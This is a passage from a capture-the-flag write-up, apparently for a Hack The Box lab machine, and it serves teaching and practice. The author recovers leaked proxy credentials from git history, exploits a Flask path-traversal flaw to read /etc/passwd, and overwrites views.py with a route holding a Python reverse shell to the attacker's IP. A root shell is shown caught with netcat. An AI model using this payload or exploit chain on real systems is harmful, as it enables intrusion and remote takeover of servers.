</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    added gitignore
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:16 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    updated
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:45:17 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    initial
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD <span style="color:#75715e"># to show the changes made on the last commit</span>
</span></span><span style="display:flex;"><span>commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 <span style="color:#f92672">(</span>HEAD -&gt; dev<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:47:24 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    ease testing
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/Dockerfile b/Dockerfile
</span></span><span style="display:flex;"><span>index 76c7768..0875eda <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>--- a/Dockerfile
</span></span><span style="display:flex;"><span>+++ b/Dockerfile
</span></span><span style="display:flex;"><span>@@ -29,7 +29,7 @@ ENV PYTHONDONTWRITEBYTECODE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Set mode</span>
</span></span><span style="display:flex;"><span> ENV MODE<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;PRODUCTION&#34;</span>
</span></span><span style="display:flex;"><span>-# ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span>+ENV FLASK_DEBUG<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span> 
</span></span><span style="display:flex;"><span> <span style="color:#75715e"># Run supervisord</span>
</span></span><span style="display:flex;"><span> CMD <span style="color:#f92672">[</span><span style="color:#e6db74">&#34;/usr/bin/supervisord&#34;</span>, <span style="color:#e6db74">&#34;-c&#34;</span>, <span style="color:#e6db74">&#34;/etc/supervisord.conf&#34;</span><span style="color:#f92672">]</span>
</span></span></code></pre></div><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ git show HEAD~1 <span style="color:#75715e"># to show the changes made on the commit before the last one and `HEAD~n` to show the n commit before the last one </span>
</span></span><span style="display:flex;"><span>commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
</span></span><span style="display:flex;"><span>Author: gituser &lt;gituser@local&gt;
</span></span><span style="display:flex;"><span>Date:   Thu Apr <span style="color:#ae81ff">28</span> 13:46:54 <span style="color:#ae81ff">2022</span> +0200
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    added gitignore
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>diff --git a/.gitignore b/.gitignore
</span></span><span style="display:flex;"><span>new file mode <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>index 0000000..e50a290
</span></span><span style="display:flex;"><span>--- /dev/null
</span></span><span style="display:flex;"><span>+++ b/.gitignore
</span></span><span style="display:flex;"><span>@@ -0,0 +1,26 @@
</span></span><span style="display:flex;"><span>+.DS_Store
</span></span><span style="display:flex;"><span>+.env
</span></span><span style="display:flex;"><span>+.flaskenv
</span></span><span style="display:flex;"><span>+*.pyc
</span></span><span style="display:flex;"><span>+*.pyo
</span></span><span style="display:flex;"><span>+env/
</span></span><span style="display:flex;"><span>+venv/
</span></span><span style="display:flex;"><span>+.venv/
</span></span><span style="display:flex;"><span>+env*
</span></span><span style="display:flex;"><span>+dist/
</span></span><span style="display:flex;"><span>+build/
</span></span><span style="display:flex;"><span>+*.egg
</span></span><span style="display:flex;"><span>+*.egg-info/
</span></span><span style="display:flex;"><span>+_mailinglist
</span></span><span style="display:flex;"><span>+.tox/
</span></span><span style="display:flex;"><span>+.cache/
</span></span><span style="display:flex;"><span>+.pytest_cache/
</span></span><span style="display:flex;"><span>+.idea/
</span></span><span style="display:flex;"><span>+docs/_build/
</span></span><span style="display:flex;"><span>+.vscode
</span></span><span style="display:flex;"><span>+
</span></span><span style="display:flex;"><span>+# Coverage reports
</span></span><span style="display:flex;"><span>+htmlcov/
</span></span><span style="display:flex;"><span>+.coverage
</span></span><span style="display:flex;"><span>+.coverage.*
</span></span><span style="display:flex;"><span>+*,cover
</span></span><span style="display:flex;"><span>diff --git a/app/.vscode/settings.json b/app/.vscode/settings.json
</span></span><span style="display:flex;"><span>deleted file mode <span style="color:#ae81ff">100644</span>
</span></span><span style="display:flex;"><span>index 5975e3f..0000000
</span></span><span style="display:flex;"><span>--- a/app/.vscode/settings.json
</span></span><span style="display:flex;"><span>+++ /dev/null
</span></span><span style="display:flex;"><span>@@ -1,5 +0,0 @@
</span></span><span style="display:flex;"><span>-<span style="color:#f92672">{</span>
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;python.pythonPath&#34;</span>: <span style="color:#e6db74">&#34;/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python&#34;</span>,
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxy&#34;</span>: <span style="color:#e6db74">&#34;http://dev01:Soulless_Developer#2022@10.10.10.128:5187/&#34;</span>,
</span></span><span style="display:flex;"><span>-  <span style="color:#e6db74">&#34;http.proxyStrictSSL&#34;</span>: false
</span></span><span style="display:flex;"><span>-<span style="color:#f92672">}</span>
</span></span></code></pre></div><p>I can see some credentials <em>dev01:Soulless_Developer#2022</em> that were stored before and then removed in this commit, but when I tried to <em>SSH</em> using them it failed, however they might be useful later on.</p>
<h2 id="spotting-a-vulnerability">Spotting A Vulnerability</h2>
<p>After cycling through the files, <em>app/app/view.py</em> caugth my interest.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>views<span style="color:#f92672">.</span>py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
</span></span></code></pre></div><p>Specifically the <em>get_file_name</em> function which is called from <em>upload_file</em> and <em>send_report</em> functions. If this function is vulnerable and doesn&rsquo;t escape the user input correctly, and if this is the code that the current application runs, then I might be able to exploit it and <em>read</em> or <em>write</em> arbitrary files.</p>
<p>So let&rsquo;s see how this function handles input:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat app<span style="color:#f92672">/</span>app<span style="color:#f92672">/</span>utils<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> time
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">current_milli_time</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> round(time<span style="color:#f92672">.</span>time() <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Pass filename and return a secure version, which can then safely be stored on a regular file system.
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_file_name</span>(unsafe_filename):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(unsafe_filename, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">TODO: get unique filename
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_unique_upload_name</span>(unsafe_filename):
</span></span><span style="display:flex;"><span>    spl <span style="color:#f92672">=</span> unsafe_filename<span style="color:#f92672">.</span>rsplit(<span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">.&#34;</span>, <span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    file_name <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">0</span>]
</span></span><span style="display:flex;"><span>    file_extension <span style="color:#f92672">=</span> spl[<span style="color:#ae81ff">1</span>]
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(file_name, <span style="color:#e6db74">&#34;../&#34;</span>, <span style="color:#e6db74">&#34;&#34;</span>) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;_&#34;</span> <span style="color:#f92672">+</span> str(current_milli_time()) <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;.&#34;</span> <span style="color:#f92672">+</span> file_extension
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">Recursively replace a pattern in a string
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#34;&#34;&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">recursive_replace</span>(search, replace_me, with_me):
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> replace_me <span style="color:#f92672">not</span> <span style="color:#f92672">in</span> search:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> search
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> recursive_replace(search<span style="color:#f92672">.</span>replace(replace_me, with_me), replace_me, with_me)
</span></span></code></pre></div><p>It appears that there are 2 functions, <em>get_file_name</em> (unsafe) and <em>get_unique_upload_name</em> (considered by the developer safe) but is not yet implemented. This code here uses the unsafe <em>get_file_name</em> that calls <em>recursive_replace</em> function which replaces <em>../</em> string with nothing, and since it is recusivly doing that, there is no way to get arround it.</p>
<p>However in the <em>app/app/views.py</em> this function is called, then its output is passed to the <em>os.path.join</em> function, then to the <em>send_file</em> function from <a href="https://github.com/pallets/flask"><em>Flask</em></a> which will return the content of the file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ cat app/app/views.py 
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>import os
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>from app.utils import get_file_name
</span></span><span style="display:flex;"><span>from flask import render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>from app import app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/&#39;</span>, methods<span style="color:#f92672">=[</span><span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span><span style="color:#f92672">])</span>
</span></span><span style="display:flex;"><span>def upload_file<span style="color:#f92672">()</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request.method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request.files<span style="color:#f92672">[</span><span style="color:#e6db74">&#39;file&#39;</span><span style="color:#f92672">]</span>
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>f.filename<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        f.save<span style="color:#f92672">(</span>file_path<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request.host_url + <span style="color:#e6db74">&#34;uploads/&#34;</span> + file_name<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;upload.html&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>@app.route<span style="color:#f92672">(</span><span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span><span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>def send_report<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>:
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name<span style="color:#f92672">(</span>path<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file<span style="color:#f92672">(</span>os.path.join<span style="color:#f92672">(</span>os.getcwd<span style="color:#f92672">()</span>, <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path<span style="color:#f92672">))</span>
</span></span></code></pre></div><p>From the first look this code appears to be secure, however the use of <em>os.path.join</em> ruined everything, because if this function takes parameters like <em>(&quot;/var/www/html&quot;, &ldquo;app&rdquo;, &ldquo;/etc/passwd&rdquo;)</em> and tries to return the path of that, instead of returning something like <em>&quot;/var/www/html/app/etc/passwd&quot;</em>, it will return <em>&quot;/etc/passwd&quot;</em> due to the <em>/</em> at the begining of the last string.</p>
<h3 id="exploiting-the-vulnerability">Exploiting the Vulnerability</h3>
<p>Now let&rsquo;s try to see if this vulnerability exists in the production code.</p>
<p>For this I will try to upload a file first and then access it to make sure that everything is normal and the application is taking my file and storing it somewhere.</p>
<p><img src="trying-to-upload-normal-file.png" alt="Uploading Normal file"></p>
<p>Looks like this application is not using a function like <em>get_unique_upload_name</em> because the name of the uploaded file is the same.</p>
<p>Now I will try the <em>Local File Inclusion</em> payload using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a>.</p>
<p><img src="Initial-LFI-try.png" alt="LFI Initial Try"></p>
<p>Looks like I got redirected. After playing a little bit with <a href="https://github.com/pallets/flask"><em>Flask</em></a> localy, I noticed that this is a nomral behavior in it, if the url path contained something like <em>uploads//something/here</em> it will redirect it to <em>uploads/something/here</em> then will process this new request.</p>
<p>To avoid this, I can make use fo the <em>get_file_name</em> being called to check for <em>../</em> string and remove it:</p>
<ul>
<li>First, I will request the path <em>uploads/..//etc/passwd</em></li>
<li><a href="https://github.com/pallets/flask"><em>Flask</em></a> will not redirect this request because the path is not <em>uploads//</em></li>
<li>Then it will call the <em>get_file_name</em> function on <em>..//etc/passwd</em> which will remove <em>../</em> and return <em>/etc/passwd</em></li>
<li>Finally <em>/etc/passwd</em> string will pass to the <em>os.path.join</em> function as parameter and will result in <em>/etc/passwd</em> being the file read</li>
</ul>
<p><img src="reading-files-with-LFI.png" alt="Reading Files with LFI"></p>
<p>I can now <em>read</em> files using this payload, however the <em>upload_file</em> function also uses the same process, which means that I can override files by passing <em>..//[path][file to override]</em> as filename.</p>
<h3 id="overriting-files-to-get-a-reverse-shell">Overriting Files to Get a Reverse Shell</h3>
<p>One possible way to get a reverse shell is to override the <em>views.py</em> file and append to it a new route that will execute our malicious code when accessed.</p>
<p>But first, I need to know where this file exists. I can do that by trying to intentionnally raise an error in the application, to see if I can get any sort of verbose error logging telling me what went wrong.</p>
<p><img src="Indentifying-where-the-application-exists.png" alt="Finding Where The Application Is"></p>
<p>Now I know that the application is inside the <em>/app/</em> directory and has the same upload hierarchy as the one I just unziped, meaning that I can guess that the <em>views.py</em> will be at <em>/app/app/views.py</em></p>
<p><img src="Reading-views-using-LFI.png" alt="Reading Views.py using LFI"></p>
<p>This code looks very similar to the one I saw before, so what I&rsquo;ll do is copy this file and append to it my malicious code then upload a new file with the name of <em>..//app/app/views.py</em> which will override the current <em>views.py</em> with my own malicious one.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#960050;background-color:#1e0010">$</span> cat malicious<span style="color:#f92672">-</span>views<span style="color:#f92672">.</span>py
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own imports for the reverse shell to work</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> socket
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> pty
</span></span><span style="display:flex;"><span><span style="color:#75715e">#############</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app.utils <span style="color:#f92672">import</span> get_file_name
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> flask <span style="color:#f92672">import</span> render_template, request, send_file
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> app <span style="color:#f92672">import</span> app
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">index</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;index.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/download&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">download</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;app&#34;</span>, <span style="color:#e6db74">&#34;static&#34;</span>, <span style="color:#e6db74">&#34;source.zip&#34;</span>))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/upcloud&#39;</span>, methods<span style="color:#f92672">=</span>[<span style="color:#e6db74">&#39;GET&#39;</span>, <span style="color:#e6db74">&#39;POST&#39;</span>])
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">upload_file</span>():
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> request<span style="color:#f92672">.</span>method <span style="color:#f92672">==</span> <span style="color:#e6db74">&#39;POST&#39;</span>:
</span></span><span style="display:flex;"><span>        f <span style="color:#f92672">=</span> request<span style="color:#f92672">.</span>files[<span style="color:#e6db74">&#39;file&#39;</span>]
</span></span><span style="display:flex;"><span>        file_name <span style="color:#f92672">=</span> get_file_name(f<span style="color:#f92672">.</span>filename)
</span></span><span style="display:flex;"><span>        file_path <span style="color:#f92672">=</span> os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, file_name)
</span></span><span style="display:flex;"><span>        f<span style="color:#f92672">.</span>save(file_path)
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;success.html&#39;</span>, file_url<span style="color:#f92672">=</span>request<span style="color:#f92672">.</span>host_url <span style="color:#f92672">+</span> <span style="color:#e6db74">&#34;uploads/&#34;</span> <span style="color:#f92672">+</span> file_name)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> render_template(<span style="color:#e6db74">&#39;upload.html&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/uploads/&lt;path:path&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">send_report</span>(path):
</span></span><span style="display:flex;"><span>    path <span style="color:#f92672">=</span> get_file_name(path)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> send_file(os<span style="color:#f92672">.</span>path<span style="color:#f92672">.</span>join(os<span style="color:#f92672">.</span>getcwd(), <span style="color:#e6db74">&#34;public&#34;</span>, <span style="color:#e6db74">&#34;uploads&#34;</span>, path))
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># my own malicious route to get a reverse shell</span>
</span></span><span style="display:flex;"><span><span style="color:#a6e22e">@app</span><span style="color:#f92672">.</span>route(<span style="color:#e6db74">&#39;/revShell/&lt;ip&gt;/&lt;port&gt;&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">connect_back</span>(ip<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>, port<span style="color:#f92672">=</span><span style="color:#66d9ef">None</span>):
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">=</span>socket<span style="color:#f92672">.</span>socket(socket<span style="color:#f92672">.</span>AF_INET,socket<span style="color:#f92672">.</span>SOCK_STREAM)
</span></span><span style="display:flex;"><span>    s<span style="color:#f92672">.</span>connect((str(ip),int(port)))
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">0</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">1</span>)
</span></span><span style="display:flex;"><span>    os<span style="color:#f92672">.</span>dup2(s<span style="color:#f92672">.</span>fileno(),<span style="color:#ae81ff">2</span>)
</span></span><span style="display:flex;"><span>    pty<span style="color:#f92672">.</span>spawn(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>)
</span></span></code></pre></div><ul>
<li>Code for reverse shell taken from <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#python">PayloadsAllTheThings</a></li>
</ul>
<p>I&rsquo;ll intercept the upload file request using <a href="https://portswigger.net/burp"><em>Burp Suite</em></a> and change the filename:</p>
<p><img src="overriding-views-file.png" alt="Overwriting views.py with malicious code"></p>
<p>Now let&rsquo;s get a reverse shell by navigating the to newly created view, <em><a href="http://opensource.htb/revShell/10.10.16.59/8989">http://opensource.htb/revShell/10.10.16.59/8989</a></em></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-shell" data-lang="shell"><span style="display:flex;"><span>$ nc -lvnp <span style="color:#ae81ff">8989</span>
</span></span><span style="display:flex;"><span>listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">8989</span> ...
</span></span><span style="display:flex;"><span>connect to <span style="color:#f92672">[</span>10.10.16.59<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.11.164<span style="color:#f92672">]</span> <span style="color:#ae81ff">52332</span>
</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># id        </span>
</span></span><span style="display:flex;"><span>    id
</span></span><span style="display:flex;"><span>    uid<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span> gid<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>0<span style="color:#f92672">(</span>root<span style="color:#f92672">)</span>,1<span style="color:#f92672">(</span>bin<span style="color:#f92672">)</span>,2<span style="color:#f92672">(</span>daemon<span style="color:#f92672">)</span>,3<span style="color:#f92672">(</span>sys<span style="color:#f92672">)</span>,4<span style="color:#f92672">(</span>adm<span style="color:#f92672">)</span>,6<span style="color:#f92672">(</span>disk<span style="color:#f92672">)</span>,10<span style="color:#f92672">(</span>wheel<span style="color:#f92672">)</span>,11<span style="color:#f92672">(</span>floppy<span style="color:#f92672">)</span>,20<span style="color:#f92672">(</span>dialout<span style="color:#f92672">)</span>,26<span style="color:#f92672">(</span>tape<span style="color:#f92672">)</span>,27<span style="color:#f92672">(</span>video<span style="color:#f92672">)</span>
</span></span><span style="display:flex;"><span>/app <span style="color:#75715e"># ip addr </span>
</span></span><span style="display:flex;"><span>    ip addr
